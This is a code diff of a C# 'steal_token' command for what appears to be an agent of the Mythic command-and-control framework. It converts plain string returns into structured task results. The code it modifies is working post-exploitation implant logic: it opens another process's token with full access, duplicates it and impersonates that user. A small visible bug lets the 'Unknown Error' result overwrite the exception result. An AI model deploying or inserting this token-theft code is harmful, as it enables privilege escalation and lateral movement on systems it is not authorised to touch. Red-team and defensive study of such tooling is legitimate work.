@@ -5,6 +5,7 @@ using Extend;
 using System;
 using System.Diagnostics;
 using System.Security.Principal;
+using System.Runtime.InteropServices;
 
 namespace Tasks.Commands
 {
@@ -12,12 +13,25 @@ namespace Tasks.Commands
     {
         public override string Name => "steal_token";
 
-        public override string Execute(MythicTask task)
+        public override MythicTaskResult Execute(MythicTask task)
         {
+            MythicTaskResult result;
+
             var Arguments = task.parameters.Split(' ');
 
             if (!int.TryParse(Arguments[0], out var pid))
-                return "Failed to parse PID";
+            {
+                result = new MythicTaskResult
+                {
+                    task_id = task.id,
+                    user_output = "Failed to parse PID",
+                    completed = true,
+                    status = "Error",
+                    error = "Failed to parse PID"
+                };
+
+                return result;
+            }
 
             // open handle to process
             var process = Process.GetProcessById(pid);
@@ -29,28 +43,73 @@ namespace Tasks.Commands
             {
                 // open handle to token
                 if (!Native.Advapi.OpenProcessToken(process.Handle, Native.Advapi.DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
-                    return "Failed to open process token";
+                {
+                    result = new MythicTaskResult
+                    {
+                        task_id = task.id,
+                        user_output = "Failed to open process token",
+                        completed = true,
+                        status = "Error",
+                        error = "Failed to open process token"
+                    };
+                    
+                    return result;
+                }
+                    
 
                 // duplicate token
                 var sa = new Native.Advapi.SECURITY_ATTRIBUTES();
                 if (!Native.Advapi.DuplicateTokenEx(hToken, Native.Advapi.TokenAccess.TOKEN_ALL_ACCESS, ref sa, Native.Advapi.SecurityImpersonationLevel.SECURITY_IMPERSONATION,
                     Native.Advapi.TokenType.TOKEN_IMPERSONATION, out hTokenDup))
                 {
-                    return "Failed to duplicate token";
+                    result = new MythicTaskResult
+                    {
+                        task_id = task.id,
+                        user_output = "Failed to duplicate token",
+                        completed = true,
+                        status = "Error",
+                        error = Marshal.GetLastWin32Error().ToString()
+                    };
+
+                    return result;
                 }
 
                 // impersonate token
                 if (Native.Advapi.ImpersonateLoggedOnUser(hTokenDup))
                 {
                     var identity = new WindowsIdentity(hTokenDup);
-                    return $"Successfully impersonated {identity.Name}";
+
+                    result = new MythicTaskResult
+                    {
+                        task_id = task.id,
+                        user_output = $"Successfully impersonated {identity.Name}",
+                        completed = true,
+                        status = "success"
+                    };
+
+                    return result;
                 }
 
-                return "Failed to impersonate token";
+                result = new MythicTaskResult
+                {
+                    task_id = task.id,
+                    user_output = "Failed to impersonate token",
+                    completed = true,
+                    status = "Error",
+                    error = Marshal.GetLastWin32Error().ToString()
+                };
+                return result;
             }
-            catch
+            catch (Exception ex)
             {
-
+                result = new MythicTaskResult
+                {
+                    task_id = task.id,
+                    user_output = ex.Message,
+                    completed = true,
+                    status = "Error",
+                    error = Marshal.GetLastWin32Error().ToString()
+                };
             }
             finally
             {
@@ -62,7 +121,16 @@ namespace Tasks.Commands
                 process.Dispose();
             }
 
-            return "Unknown error";
+            result = new MythicTaskResult
+            {
+                task_id = task.id,
+                user_output = "Unknown Error",
+                completed = true,
+                status = "Error",
+                error = Marshal.GetLastWin32Error().ToString()
+            };
+
+            return result;
         }
     }
 }
